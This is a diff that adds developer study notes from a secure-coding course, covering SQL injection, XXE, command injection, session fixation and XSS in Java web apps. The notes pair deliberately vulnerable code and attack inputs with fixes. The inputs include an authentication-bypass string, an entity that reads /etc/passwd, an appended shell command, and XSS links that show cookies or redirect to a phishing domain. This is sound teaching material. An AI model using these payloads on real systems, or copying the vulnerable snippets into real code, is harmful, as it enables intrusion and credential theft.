@@ -1,0 +1,2781 @@
+= Security code bashing
+Thomas SCHWENDER <https://github.com/ardemius[@ardemius]>
+// Handling GitHub admonition blocks icons
+ifndef::env-github[:icons: font]
+ifdef::env-github[]
+:status:
+:outfilesuffix: .adoc
+:caution-caption: :fire:
+:important-caption: :exclamation:
+:note-caption: :paperclip:
+:tip-caption: :bulb:
+:warning-caption: :warning:
+endif::[]
+:imagesdir: images
+:resourcesdir: resources
+:source-highlighter: highlightjs
+// Next 2 ones are to handle line breaks in some particular elements (list, footnotes, etc.)
+:lb: pass:[<br> +]
+:sb: pass:[<br>]
+// check https://github.com/Ardemius/personal-wiki/wiki/AsciiDoctor-tips for tips on table of content in GitHub
+:toc: macro
+:toclevels: 3
+// To turn off figure caption labels and numbers
+//:figure-caption!:
+// Same for examples
+//:example-caption!:
+// To turn off ALL captions
+:caption:
+
+toc::[]
+
+Those courses come from the *Security Codebashing* of *Checkmarx*. +
+(*Codebashing* is a hands-on, interactive solution that fits into developers' daily routines).
+
+A free, incomplete, version is available at https://free.codebashing.com/.
+
+== Java Classic
+
+=== Injection
+
+==== SQL Injection
+
+SQL Injection is a type of application security vulnerability whereby a malicious user is able to manipulate the SQL statements that the application sends to the backend database server for execution. A successful SQL injection attack exposes the data of the underlying database directly to the attacker. Play and Learn...
+
+.BAD way to check authentication through a SQL statement
+[source,java]
+----
+String email = request.getParameter("email");
+String password = request.getParameter("password");
+
+String sql = "select * from users where (email ='" + email +"' and password ='" + password + "')";
+
+Connection connection = pool.getConnection();
+Statement statement = connection.createStatement();
+ResultSet result = statement.executeQuery(sql);
+
+if (result.next()) {
+    loggedIn = true;
+    // Successfully logged in and redirect to user profile page
+} else {
+    // Auth failure - Redirect to Login Page
+}
+----
+
+* The string variable sql is then declared, which represents the SQL query used to authenticate Kevin's credentials. +
+Note, that Kevin's email and password values are concatenated to build the final query.
+* The SQL query defined in sql string variable is then executed by invoking the executeQuery method. This method executes our query against the backend SQL server and returns a ResultSet object which is checked on line 10 through the if/else block. +
+Finally, should Kevin's credentials match, the loggedIn variable is set to true and she is redirected to her profile page.
+
+With the previous code, if we try as password the string `' or 1=1)#'`, here is what the SQL statement will look like:
+
+.SQL injection attack example
+[source,SQL]
+----
+String sql = "select * from users where (email ='" + email +"' and password ='" + password + "')";
+​
+// Below is the raw query sent to the DB:
+"SELECT * FROM users WHERE (email = 'kevin@noob.com' AND password = '' or 1=1)#')"
+----
+
+* Because this statement is both syntactically valid and `OR 1=1` always returns true, *the authentication mechanism is bypassed*.
+
+The remediation to this issue is the use of *prepared statements*.
+
+Prepared statements (aka parameterized queries) are the best mechanism for preventing SQL injection attacks.
+
+*Prepared statements are used to abstract SQL statement syntax from input parameters*. Statement templates are first defined at the application layer, and the parameters are then passed to them.
+
+Aside from a better protection against SQL injection attacks, prepared statements offer *improved code quality* from a legibility and maintainability perspective due to the *separation of the SQL logic from its inputs*.
+
+==== XXE - XML eXternal Entity
+
+*XML External Entity* (XXE) Processing is a type of application security vulnerability whereby a malicious user can *attack poorly configured/implemented XML parser within an application*. +
+Malicious external entity references can be forced by an attacker, which results in unauthorized read-access to sensitive files on the server that the XML parser runs from. Denial of Service is another potential outcome. Play and Learn...
+
+In this interactive tutorial you will understand how XML eXternal Entity (XXE) processing attacks are used to compromise the security of a web application, and how to write code more securely to protect against this type of attack.
+
+NOTE: Throughout this module we will use the following terms interchangeably: XML Parser, SAX Parser and XML Processor.
+
+.classic XML trade file
+[source,xml]
+----
+<trades>
+    <metadata>
+        <name>Apple Inc</name>
+        <stock>APPL</stock>
+        <trader>
+            <name>C.K Frode</name>
+        </trader>
+        <units>1500</units>
+        <price>106</price>
+        <name>Microsoft Corp</name>
+        <stock>MSFT</stock>
+        <trader>
+            <name>C.K Frode</name>
+        </trader>
+        <units>5000</units>
+        <price>45</price>
+        <name>Amazon Inc</name>
+        <stock>AMZN</stock>
+        <trader>
+            <name>C.K Frode</name>
+        </trader>
+        <units>4500</units>
+        <price>195</price>
+    </metadata>
+</trades>
+----
+
+An XXE attack works by taking advantage of a feature in XML, namely *XML eXternal Entities (XXE)* that *allows external XML resources to be loaded within an XML document*. +
+By submitting an XML file that defines an external entity with a file:// URI, an attacker can effectively trick the application's SAX parser into reading the contents of arbitrary file(s) that reside on the server-side filesystem.
+
+.Malicious XML file
+[source,xml]
+----
+<!DOCTYPE foo [<!ELEMENT foo ANY >
+<!ENTITY bar SYSTEM "file:///etc/passwd" >]>
+<trades>
+  <metadata>
+      <name>Apple Inc</name>
+      <stock>APPL</stock>
+      <trader>
+          <foo>&bar;</foo>
+          <name>C.K Frode</name>
+      </trader>
+      <units>1500</units>
+      <price>106</price>
+      <name>Microsoft Corp</name>
+      <stock>MSFT</stock>
+      <trader>
+          <name>C.K Frode</name>
+      </trader>
+      <units>5000</units>
+      <price>45</price>
+      <name>Amazon Inc</name>
+      <stock>AMZN</stock>
+      <trader>
+          <name>C.K Frode</name>
+      </trader>
+      <units>4500</units>
+      <price>195</price>
+  </metadata>
+</trades>
+----
+
+* The DOCTYPE foo declaration references an external Document Type Definition (DTD) file, which we have named foo
+* The XML declaration ELEMENT foo ANY declares that foo DTD can contain any combination of parsable data.
+* Finally we use the XML declaration ENTITY to load additional data from an external resource. The syntax for the ENTITY declaration is ENTITY name SYSTEM URI where URI is the full path to a remote URL or local file. In our example we define the ENTITY tag to load the contents of "file:///etc/passwd"
+* The following line maps our tag foo to the external entity &bar; that points to "file:///etc/passwd"
+* When this XML document is processed by BatchTRADER's SAX parser, any instances of &bar; will get replaced by the contents of /etc/passwd file.
+
+.Vulnerable code
+[source,java]
+----
+public class TradeDocumentBuilderFactory {
+    public static DocumentBuilderFactory newDocumentBuilderFactory() {
+        DocumentBuilderFactory documentBuilderFactory = DocumentBuilderFactory.newInstance();
+        try {
+            documentBuilderFactory.setFeature("http://xml.org/sax/features/external-general-entities", true);
+            documentBuilderFactory.setFeature("http://xml.org/sax/features/external-parameter-entities", true);
+        } catch(ParserConfigurationException e) {
+            throw new RuntimeException(e);
+        }
+        return documentBuilderFactory;
+    }
+}
+----
+
+* The DocumentBuilderFactory class further contains a setFeature(String,boolean) method which can be used to set features on the underlying SAX parser.
+* In this example the developers have configured the SAX parser using the setFeature method to enable loading of external-general-entities by setting it's value to true
+* Similarly, the SAX parser has also been configured to process external-parameter-entities entities. Both of these options allow the SAX parser to load external entities, which when specified within our trade.xml file can be abused by an attacker to read arbitrary system files. Were these set to false the SAX parser would automatically reject the referencing of external entities.
+
+Because user supplied XML input comes from an "untrusted source" it is very difficult to properly validate the XML document in a manner to prevent against this type of attack. +
+Instead the XML processor should be configured to use only a locally defined Document Type Definition (DTD) and *disallow any inline DTD that is specified within user supplied XML document(s)*. +
+Due to the fact that there are numerous XML parsing engines available, each has its own mechanism for disabling inline DTD to prevent XXE. You may need to search your XML parser's documentation for how to "disable inline DTD" specifically.
+
+Let's see how the above fix can be applied to our vulnerable example to remediate the XXE vulnerability.
+
+.Remediation
+[source,java]
+----
+public class TradeDocumentBuilderFactory {
+​
+    public static DocumentBuilderFactory newDocumentBuilderFactory() {
+        DocumentBuilderFactory documentBuilderFactory = DocumentBuilderFactory.newInstance();
+        try {
+//              documentBuilderFactory.setFeature("http://xml.org/sax/features/external-general-entities", true);
+//              documentBuilderFactory.setFeature("http://xml.org/sax/features/external-parameter-entities", true);
+                documentBuilderFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+                documentBuilderFactory.setFeature("http://xml.org/sax/features/external-general-entities", false);
+                documentBuilderFactory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);    
+        } catch(ParserConfigurationException e) {
+            throw new RuntimeException(e);
+        }
+        return documentBuilderFactory;
+    }
+}
+----
+
+* *The most robust method to protect against XXE attacks is to configure the applications XML parser to not allow DOCTYPE declarations*. +
+This is done by setting the parsers disallow-doctype-decl parameter to true. With this set, an exception occurs if our trade.xml contains a DOCTYPE declaration and parsing stops, preventing the vulnerability from exposing sensitive information.
+* However, if DOCTYPE declarations are required by the application, a good alternative is to configure the server side SAX parser to disallow declaring of external entities by setting the value for external-general-entities to false
+* Similarly, we can also disable external-parameter-entities via the setFeature method.
+
+==== Command Injection
+
+A Command Injection vulnerability, when exploited by a malicious user, results in execution of arbitrary system commands on the host operating system. Command Injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers, etc) to a system command. The malicious system command is run server side with the same privileges as the application.
+
+To create the analytical report, the web application's server-side code invokes a custom C++ application called statlab to perform the computationally intensive statistical analysis.
+
+.Vulnerable code
+[source,java]
+----
+//
+// The following is a code snippet illustrating the use of insecure command execution function in Java
+//
+​
+public class CommandExecuter {
+    public string executeCommand(String userName)
+    {
+        try {
+            String myUid = userName;
+            Runtime rt = Runtime.getRuntime();
+            rt.exec("/usr/bin/statlab " + ”-“ + myUid); // Call statlab with Kevin's username
+​
+            // process results for userID and return output in HTML.
+            // ...
+​
+        }catch(Exception e)
+        {
+            e.printStackTrace();
+        }    
+    }
+}
+----
+
+* The executeCommand method calls the `java.lang.Runtime.exec()` function which invokes the /usr/bin/statlab application. The `exec()` method further accepts myUID as a parameter, whose value is passed to statlab program as an argument. +
+For Kevin's profile the resulting string executed by `exec()` would be: `/usr/bin/statlab -kevin`
+
+To understand how command injection attacks work, let us analyze the URL passed to our server-side code.
+
+    https://tradeadmin.codebashing.com/console/execute?username=Kevin
+
+When Kevin generates a Risk Analysis report, the TradeADMIN server parses the above URL, specifically the query string `username=Kevin` which is then passed to the function to generate analytical reports for Kevin's trading account.
+
+If, in the previous URL, we append the ";id" string:
+
+    https://tradeadmin.codebashing.com/console/execute?username=Kevin;id
+
+In addition to the classic result (the analytical report), an Unexpected Output Error is also displayed:
+
+----
+ERROR: Unexpected output encountered: uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) context=root:sysadm_r:sysadm_t
+----
+
+This error comes from the previous "id" string that was added at the end of the URL, and which *has been executed as the UNIX `id` command*, that returns the user id for the user that ran the command.
+
+* In the previous code, the executeCommand method initializes a runtime environment by invoking Runtime.getRuntime() method that allows the TradeADMIN application to interface with it's runtime environment.
+* Finally executeCommand invokes the statlab program via `exec()`, passing Kevin's modified query string `Kevin;id` as an argument through myUid string variable. The final command executed on TradeADMIN server would be: `statlab -Kevin;id`
+{lb}
+However note that `myUid` value is not validated in any way before being passed to the `exec()` method. Given that the ";" character is interpreted as a command separator in UNIX like operating systems, *Kevin's query string is interpreted by `exec()` method as two separate commands* i.e statlab -Kevin and id
+
+.Remediation
+[source,java]
+----
+//
+// The following is a code snippet illustrating the use of insecure command execution function in Java
+//
+​
+public class CommandExecuter {
+    public string executeCommand(String userName)
+    {
+        try {
+            String myUid = userName;
+            if (!Pattern.matches("[-A-Za-z]+", myUiD)) {  
+                return false;
+        }
+            Runtime rt = Runtime.getRuntime();
+            rt.exec("/usr/bin/statlab " + ”-“ + myUid); // Call statlab with Kevin's username
+​
+            // process results for userID and return output in HTML.
+            // ...
+​
+        }catch(Exception e)
+        {
+            e.printStackTrace();
+        }
+    }
+}
+----
+
+* In our modified code example, an additional check is introduced which performs input validation against the myUiD string variable. To accomplish this, we make use of Java's `Pattern.matches()` method to run a regular expression search on myUiD variable, identifying non alphanumeric characters e.g. `; , < , > , " , ' , &` .
+{lb}
+Should any non alphanumeric characters be encountered, the `if` check will fail and return, thus preventing malicious control shell characters from being passed to the `statlab` program.
+
+[NOTE]
+======
+Note: Although the proposed fix is sufficient to remediate our vulnerable example, the overall logic and security design for executeCommand() method can be significantly improved by not accepting user supplied myUiD value through the username parameter.
+
+A better approach would be to extract Kevin's username from a database record or a static index variable that is set during Kevin's account creation process, which can then be passed as an argument to the statlab program for execution.
+======
+
+Some examples of OS Command Injection attacks can be found on Checkmarx resources https://www.checkmarx.com/knowledge/knowledgebase/os-command-injection
+
+=== Broken Authentication and Session Management
+
+==== Session Fixation
+
+*Session Fixation* is a type of application vulnerability where *an application does not correctly renew session tokens when changing from a pre-login to post-login state*. The same pre-login session token should not be used post-login, otherwise an attacker has the potential to steal authenticated sessions of legitimate users. When a session of one user is stolen by another, it is known as a "hijacked session". Play and Learn...
+
+As an example, when trying to login to a Web application, the URL returned by the server could look like this one:
+
+    https://tradesupport.codebashing.com/trade_support/log-in?app_session_id=tWwO8aTiYZXJy2ZW2zNsVOVVQD6POgrW
+
+The web application has assigned Kevin a unique *session identifier* (also known as a *session token*). +
+In our example, Kevin's session identifier is set to: `tWwO8aTiYZXJy2ZW2zNsVOVVQD6POgrW`
+
+An attacker will also get an session token when clicking on the Web application "login" button :
+
+    https://tradesupport.codebashing.com/trade_support/log-in?app_session_id=y4hJoGIcuV1v1kSKwo5y9iLDKRiSHobs
+
+The attacker then send this URL to a user, asking him to login with it (for some false reasons)
+
+Kevin has logged in successfully, and the attacker, that was keeping regularly refreshing the login page, has successfully bypassed the authentication and accessed kevin's web session without trying to guess or brute force her credentials. +
+Because of this *Session Fixation* attack, the attacker has managed to *hijack* Kevin's session!
+
+.Vulnerable code
+[source,java]
+----
+private Boolean authenticate(HttpServletRequest request, String credential, String password) {
+        try {
+            request.getSession(true);
+            if (request.getUserPrincipal() === null) {
+                request.login(credential, password);
+            }
+            return true;
+​
+        } catch (ServletException ex) {
+            log.log(Level.WARNING, "Error when authenticate", ex);
+        }
+        return false;
+}
+----
+
+The authenticate() function calls login() which verifies Kevin's credentials. However his existing session is not invalidated before invoking the login() method.
+
+This means his pre-login session identifier would remain unchanged post login.
+
+Given that the attacker knows Kevin's pre-authentication session value, he can successfully impersonate his authenticated session once Kevin has logged onto the TradeSUPPORT application.
+
+A combination of the following best practices could help to defend against Session Fixation attacks:
+
+    1. Ensure that only *server-generated session* values are accepted by the application.
+    2. Upon a successful login, *invalidate the original session token*, and re-issue a new session token.
+    3. *Prevent* the application from accepting session tokens via *GET* or *POST* requests and instead store session values within HTTP cookies only.
+
+.Remediation
+[source,java]
+----
+private Boolean authenticate(HttpServletRequest request, String credential, String password) {
+        // Prevent Session Fixation (http://en.wikipedia.org/wiki/Session_fixation)
+        HttpSession session = request.getSession(false);
+        if (session != null) {
+          session.invalidate();
+        }
+        try {
+            request.getSession(true);
+            if (request.getUserPrincipal() === null) {
+                request.login(credential, password);
+            }
+            return true;
+​
+        } catch (ServletException ex) {
+            log.log(Level.WARNING, "Error when authenticate", ex);
+        }
+        return false;
+}
+----
+
+Here a new session identifier is generated for Kevin by invoking request.getSession(true) method, ensuring his *session identifier gets recycled prior to authentication*.
+
+Should the attacker now attempt a session fixation attack against Kevin, it would fail because the session identifier has changed from it's original value that was known previously to the attacker, thus preventing the hijacking of Kevin's session.
+
+.Reminder
+NOTE: Session fixation happens when the application uses the same session token before and after the user authenticates. After authentication, the application just upgrades the token to give access to the functionality that requires authentication.
+
+==== Use Of Insufficiently Random Values
+
+*Insufficiently Random Values* are an application security vulnerability whereby the application generates predictable values in sensitive areas of code that absolutely require strict randomness (unpredictability). As a result it may be possible for an attacker to predict the next value generated by the application to defeat cryptographic routines, access sensitive information, or impersonate another user.
+
+.Vulnerable code
+[source,java]
+----
+// Generate and return a new session identifier.
+​
+protected String newSession()
+{
+    long now = System.currentTimeMillis();
+​
+    return encode(now);
+}
+​
+
+private String encode(long time)
+{
+    return new String(Long.toString(time));
+}
+----
+
+The best way to remediate the *Insufficiently Random Values* vulnerability is to use an algorithm that is currently considered to be strong by experts in the field, and select well-tested implementations with the seeds of the adequate length.
+
+In general, if a *pseudo-random number generator* is not advertised as being cryptographically secure, it should not be used in security-sensitive contexts.
+
+Pseudo-random number generators can produce predictable numbers if the generator is known and the seed can be guessed. A *256-bit seed* is a good starting point for producing a "random enough" number.
+
+.Remediation
+[source,java]
+----
+// Generate and return a new session identifier.
+​
+protected String newSession()
+{
+    //  long now = System.currentTimeMillis();
+        SecureRandom rand = new SecureRandom();
+        byte bytes[] = new byte[20];    
+        rand.nextBytes(bytes);  
+        String cookie = new String(Hex.encodeHex(bytes));   
+        return cookie   
+    //  return encode(now);
+}
+​
+    //private String encode(long time)
+    //{
+    //  return new String(Long.toString(time));
+    //}
+----
+
+In Java, generating a series of cryptographically secure random numbers can be achieved by using the `java.security.SecureRandom` class. 
+
+In our modified code example, we first create a SecureRandom object and assign it to the variable `rand`.
+Then we call `rand.nextBytes()` method that generates 20 bytes of random data which is hex encoded using the `encodeHex()` method on line 11 and assigned to the string variable cookie.
+
+* *What are the consequences of insufficiently random values usage?*
+    ** Session ID could be predicted and an attacker could access the application as another user
+
+=== Cross-Site Scripting
+
+==== Reflected Xss
+
+Unlike Persistent XSS, with *Reflected Cross-site Scripting (XSS)* attacker-supplied script code is never stored within the application itself. Instead the attacker crafts a *malicious request to the application to illicit a single HTTP response* by the application that contains the attacker's supplied script code. Successful attacks require victim users to open a maliciously crafted link (which is very easy to do). 
+
+Bob is an attacker and wants to execute his malicious JavaScript code in Alice's browser. +
+If Bob is successful in his attack, he can steal Alice's session token, thus gaining access to the application using the same session as Alice!
+
+Using a *stolen session token to access an application* as another user is known as *Session Hijacking*.
+
+Bob writes a malicious email to Alice, asking her to check out a new research report at the TradeSEARCH portal.
+
+----
+Hi Alice,
+
+TradeSEARCH portal was recently updated with some interesting research papers provided by our leading analysts. To save you time, use the link below:
+
+https://tradesearch.codebashing.com/projects?search=%3Cscript%3Ealert('You got hacked')%3C%2Fscript%3E
+
+Kind Regards,
+Bob
+----
+
+Alice would normally ignore unsolicited emails, but the information looks relevant to her and she decides to open it. +
+When Alice clicks on the link that Bob sent her, the website loads as expected. +
+However, Bob's malicious JavaScript code was also executed in Alice's browser.
+
+NOTE: This ability to *execute a malicious script in a user's browser* is known as a *Cross-site Scripting vulnerability*.
+
+Let's now analyze how the vulnerability occurred. +
+Note that if Bob was a smarter attacker, he could have stolen Alice's session instead of just displaying a pop-up window in her browser.
+
+.Vulnerable code
+[source,html]
+----
+//
+// Pseudocode for Project Search JSP webpage
+//
+​
+<c:when test="${f:h(allRecordCount) != 0}">
+<jsp:include page="searchResults.jsp"/>
+</c:when>
+<c:otherwise>
+  <h4>No results found for: </h4>
+  <p><em><strong><%= request.getParameter("search") %></strong></em></p>
+</c:otherwise>
+----
+
+* In order to generate the search results web page, TradeSEARCH developers have used the JSP Standard Templating Library (JSTL) which provides standard actions and methods for formatting and rendering HTML pages.
+* When rendering a user's search result web page, the `c:when` conditional tag is called to check if any search results were returned by the server, which are then formatted and rendered by searchResults.jsp on line 6
+* However, should no matching results be found for a specified keyword, the `c:otherwise` conditional tag will render the HTML markup on line 9 and 10 that renders a "No results found for:" message followed by the user supplied search phrase.
+* To render the "No results found for:" error message followed by our search phrase string, `request.getParameter()` method is called to extract the search parameter from the URL which then gets directly rendered as a JSP expression. +
+e.g. For `projects?search=sometext` the JSP expression `request.getParameter("search")` will yield sometext which is finally rendered in the user's browser.
+* Unfortunately, *JSP's expression language does not escape expression values*, so if the search parameter contained HTML formatted data, *Java's EL expression will simply render this string* without escaping or encoding it first. +
+Finally when the "No results found for:" message is displayed, the search parameters HTML data string will also get rendered, thereby allowing code injection in the users browser context.
+
+The *main Reflected XSS remediation strategy* is to treat all the user input as a text, not as a code. This can be achieved by the following actions:
+
+    1. *Escape user input* using language-specific or framework-specific instruments, like templates or contextual escaping. Usually, these mechanisms are enabled by default, so make sure not to disable them.
+
+    2. Know all the locations where user input is used, and try to *avoid returning unsanitized user input* to potentially dangerous locations like HTML body and attributes, javascript, GET parameters, URLs, links, CSS.
+
+    3. Use *additional security controls* that help to prevent XSS in case escaping controls fail or are missing.
+
+        * *`HTTPOnly` cookie flag*. This flag prevents Javascript from accessing the cookie content, thus protecting it from being stolen if Reflected XSS is present.
+        * *Content Security Policy HTTP Header*. This header restricts sources of all the page's content, including javascript code, to the *whitelist of sources*, thus making XSS exploitation more hard to perform.
+        * *X-XSS-Protection HTTP Header*. This header prevents browsers from loading a page if they detect Reflected XSS exploitation.
+
+.Remediation
+[source,html]
+----
+//
+// Pseudocode for Project Search JSP webpage
+//
+​
+<c:when test="${f:h(allRecordCount) != 0}">
+<jsp:include page="searchResults.jsp"/>
+</c:when>
+<c:otherwise>
+  <h4>No results found for: </h4>
+    <p><em><strong><c:out value="${<%= request.getParameter("search") %>}"/></strong></em></p>
+//    <p><em><strong><%= request.getParameter("search") %></strong></em></p>
+</c:otherwise>
+​
+----
+
+The *most effective method to protect against XSS attacks* is by using JSTL's `c:out` tag or `fn:escapeXml()` EL function when displaying user-controlled input. +
+These tags will automatically *escape and encode HTML characters* within the rendered HTML including `<` , `>` , `"` , `'` and `&` thereby preventing injection of potentially malicious HTML code.
+
+* *What is the necessary condition for Reflected XSS attack?*
+    ** *User input is returned in HTTP response to the browser*, e.g. in an error or a search result +
+    The core concept of reflected XSS is exploiting user input reflected to user's browser in errors, search results, etc. The attacker tricks a user to open a vulnerable site with a malicious script inserted into the input field. This script is reflected back to user's browser and is treated by the browser as a part of the site.
+
+=== Stored (Persistent) XSS
+
+*Persistent Cross-Site Scripting (XSS)* is an application vulnerability whereby a malicious user tricks a web application into *storing attacker-supplied script code which is then later served* to unsuspecting user(s) of the application. The attacker-supplied script code runs on the client-side system of other end user(s) of the application. This type of vulnerability is widespread and affects web applications that utilize (unvalidated) user-supplied input to generate (unencoded) application output, that is served to users. 
+
+Although Bob is a legitimate user of the application, he plans to attack other users. +
+Log in as Bob with the following credentials:
+
+    * Username: bob@bank.com
+    * Password: bob123
+
+Bob wants to add new contact records to the Partners List. +
+When the New Contact page opens, Bob decides to put the malicious script into one of the input fields. He created the following script:
+
+    <script>alert(document.cookie)</script>
+
+Then he pastes it into the Name input field and clicks Save to send the contents of the form to the server and save the new contact to the application's database.
+
+Bob successfully saved this unusual contact record to the application's database. +
+To investigate the impact on other users of the application, we need first to log out from Bob's account and close his application session.
+
+Alice opens the application to look up the most recent list of contacts. +
+Log in as Alice using her authentication credentials:
+
+    * Username: alice@bank.com
+    * Password: alice123
+
+Interesting! When Alice logs in to the application to view contact records, something strange happens – a browser alert appears. +
+It seems that the malicious script that Bob saved in the contact record was executed in Alice's browser. This script code was the following:
+
+    <script>alert(document.cookie)</script>
+
+Let's look at the vulnerable code to understand how the Stored Cross-Site Scripting attack works at the code level :
+
+.Vulnerable code
+[source,java]
+----
+//
+// The following is a code snippet illustrating the use of insecure encoding/decoding in Java
+//
+​
+<table>
+    <c:forEach var="contact" items="${contacts}">
+        <tr>
+              <td>${contact.name}</td>
+              <td>${contact.title}</td>
+              <td>${contact.number}</td>
+        </tr>
+    </c:forEach>
+</table>
+----
+
+Each contact object is rendered within the td tags using Java's JSP expression language (EL) syntax `${}`. This feature allows outputting the result of a contact object by first evaluating the object expression.
+
+For example, to extract Alice's name, the expression `<td>${contact.name}</td>` will be evaluated and replaced by the string Alice in the final HTML output markup.
+
+Unfortunately, *JSP's EL function does not escape expression values*, so if Bob saved a contact card, whose name , title or number field contained HTML formatted data, Java's EL expression will simply render the input without escaping or encoding it first. +
+Finally when the web page is loaded by Alice, Bob's malicious HTML will get rendered in Alice's browser.
+
+To *defend against Stored Cross-Site Scripting attacks*, it is important to *ensure that user-supplied data output is encoded before being served* by the application to other users.
+
+*Output encoding* effectively works by escaping user-supplied data immediately before it is served to users of the application.
+
+When the data is correctly escaped before being served to the user for display in their browser, the browser does not interpret it as code and instead interprets it as data, thus ensuring it does not get executed.
+
+For example, the string `<script>` is converted to `&lt;script&gt;` when properly escaped and is simply rendered as text in the user's browser window rather than being interpreted as code.
+
+.Remediation
+[source,java]
+----
+//
+// The following is a code snippet illustrating the use of insecure encoding/decoding in Java
+//
+​
+<table>
+    <c:forEach var="contact" items="${contacts}">
+        <tr>
+//              <td>${contact.name}</td>
+//              <td>${contact.title}</td>
+//              <td>${contact.number}</td>
+                <td><c:out value="${contact.name}"/></td>
+                <td><c:out value="${contact.title}"/></td>  
+                <td><c:out value="${contact.number}"/></td> 
+        </tr>
+    </c:forEach>
+</table>
+----
+
+The *most effective method to protect against XSS attacks* is by using JSTL's `c:out` tag or `fn:escapeXml()` EL function when displaying user-controlled input. These tags will automatically escape and encode HTML characters within the rendered HTML including `<` , `>` , `"` , `'` and & thereby preventing injection of potentially malicious HTML code.
+
+How does an attacker exploit Stored XSS?
+
+    * Attacker sends a malicious script to a server using a vulnerable functionality (e.g. comments), and the script is successfully saved to the server. Then this script is served to users and executed in their browsers. +
+    Stored XSS is possible when a malicious script is saved on the server without sanitization and then served to the application users unsanitized.
+
+=== DOM Cross Site Scripting
+
+*Document Object Model (DOM) Based XSS* is a type of XSS attack wherein the attacker's payload is executed as a result of modifying the DOM “environment” in the victim’s browser used by the original client side script, so that the client side code runs in an “unexpected” manner. That is, the page itself (the HTTP response that is) does not change, but the client side code contained in the page executes differently due to the malicious modifications that have occurred in the DOM environment.
+
+The vulnerable application pane loads the TradeNEWS application, an online financial news platform that provides in-depth analysis of financial products, market indexes, and currencies.
+
+Alice is a guest (anonymous) user of the TradeNEWS system. She has just loaded the application in her web browser. +
+Alice decides to read a news report and proceeds by clicking the Thursday Share Tips news article.
+
+It appears that Alice is not a paid member of the TradeNEWS portal, so she is redirected to a login screen to sign up for a paid membership or log in with existing credentials.
+
+Notice that a "welcome" message:
+
+    Hello guest! Please log in or sign up to access news stories
+    
+is displayed as a part of the TradeNEWS login screen. Before we proceed with our DOM XSS attack, let's quickly analyze the source code used to generate this message.
+
+[source,javascript]
+----
+//
+// Pseudocode for Landing web page
+//
+<h6>
+<script>
+​
+    var name = document.location.hash.split('#')[1]; 
+//https://tradenews.codebashing.com/guests/landing#guest
+​
+    document.write("Hello " + name + "! Please login or signup to access news stories");    
+​
+</script>
+</h6>
+----
+
+The javascript code `document.location.hash.split('#')[1]` returns the anchor part of the TradeNEWS URL which is set to `#guest` +
+(TradeNEWS URL : `https://tradenews.codebashing.com/guests/landing#guest`)
+
+The code `split('#')[1]` extracts the string "guest" and assigns it to name variable.
+
+Finally, the name variable is concatenated with the alert message text and written to the Document Object Model (DOM) using javascript's `document.write()` method.
+
+Before we proceed with the attack, go ahead and try replacing *guest* with the string *myinput* in the address bar of the fake browser. Keep an eye on the code window to see the code being updated in real time with your input string.
+
+Bob is an attacker and has just discovered a DOM XSS vulnerability within the TradeNEWS website, specifically in the JavaScript code responsible for displaying the "welcome” message. +
+Bob knows that by exploiting the DOM XSS vulnerability he can trick Alice into submitting her credit card details to Bob, but how can he organize this?
+
+First, Bob registers a domain called *fake-tradenews.codebashing.com* and configures it to point to his own web server. Then Bob configures his webserver to host a fake login and credit card payment page that copies the original design and layout of the TradeNEWS login web page hosted on tradenews.codebashing.com.
+
+After that Bob crafts a malicious email to Alice, inviting her to join the TradeNEWS portal. He also offers her a 20% discount if she signs up via Bob's invitation link.
+
+----
+Hi Alice,
+Hope you are well ! Please find below a 20% discount code to join TradeNEWS.
+
+
+https://tradenews.codebashing.com/guests/landing#<script>window.location = 'https://fake-tradenews.codebashing.com';</script>
+Kind Regards,
+Bob
+----
+
+Alice would normally ignore unsolicited emails, but information in the email looks relevant to her, so she decides to follow the link.
+
+Alice is redirected to Bob's fake TraderNEWS login/signup page hosted on fake-tradenews.codebashing.com.
+
+When Alice attempts to sign up with her payment card details, she submits them to Bob's fake web page, thereby compromising the security of her payment card!
+
+Let's now analyze how Bob exploited the DOM XSS flaw on TraderNEWS portal.
+
+.Vulnerable code
+[source,javascript]
+----
+//
+// Pseudocode for Landing web page
+//
+<h6>
+<script>
+​
+    var name = document.location.hash.split('#')[1]; 
+//https://tradenews.codebashing.com/guests/landing#guest
+​
+    document.write("Hello " + name + "! Please login or signup to access news stories");
+​
+</script>
+</h6>
+----
+
+The recap, the name variable derives it's value from document.location.hash property by first calling the javascript `document.location.hash.split('#')[1]` 
+The name variable is then concatenated with additional 'message text' and written to the Document Object Model (DOM) via the `document.write()` method. Note that the original URL from which the "guest" string was derived is *user controllable* and therefore considered as *untrusted input*. +
+However a *lack of input validation for the name variable* means that Bob can now *inject malicious javascript code* through the TradeNEWS URL, thus achieving client side code execution in Alice's browser context.
+
+==== Remediation
+
+To defend against Cross-Site Scripting attacks in a Document Object Model (DOM) environment, a defense-in-depth approach is required, combining several security best practices.
+
+You should recall that *Stored XSS* and *Reflected XSS injections* take place *server-side rather than client-side*. With DOM XSS, the attack is injected into the browser’s DOM thus adding complexity by making it very difficult to prevent and highly context specific (because an attacker can inject HTML, HTML Attributes, or CSS as well as URLs).
+
+As a general set of principles, the application should *first HTML-encode* and *then JavaScript-encode any user-supplied data* that is returned to the client.
+
+Due to the very broad attack surface, developers are strongly encouraged to review areas of code that are potentially susceptible to DOM XSS, including but not limited to:
+
+*window.name document.referrer document.URL document.documentURI location location.href location.search location.hash eval setTimeout setInterval document.write document.writeIn innerHTML outerHTML*
+
+Let us apply a suitable Regex pattern to remediate this DOM XSS vulnerability.
+
+.Remediation
+[source,javascript]
+----
+//
+// Pseudocode for Landing web page
+//
+<h6>
+<script>
+​
+   var name = document.location.hash.split('#')[1]; 
+//https://tradenews.codebashing.com/guests/landing#guest
+   
+    if (name.match(/^[a-zA-Z0-9]*$/))
+    {
+        document.write("Hello " + name + "! Please login or signup to access news stories");
+    }
+​
+​
+    else
+    {
+        window.alert("Security error");
+    }
+</script>
+</h6>
+----
+
+In our modified code example, an *additional check* is introduced which performs *input validation* against the name string variable. To accomplish this, we make use of javascript's `match()` method to run a *regular expression* search on name variable, *identifying non alphanumeric characters* e.g. `#` , `<` , `>` , `"` , `'` , `&` . +
+Should any non alphanumeric characters be encountered, the if check will fail and invoke the "Security error" warning, thus preventing malicious javascript or HTML characters from being passed to the `document.write()` method.
+
+How would you protect yourself from an XSS attack?
+
+    * Encoding the output is the best approach as it takes into consideration all types of XSS attacks and mitigates them.
+
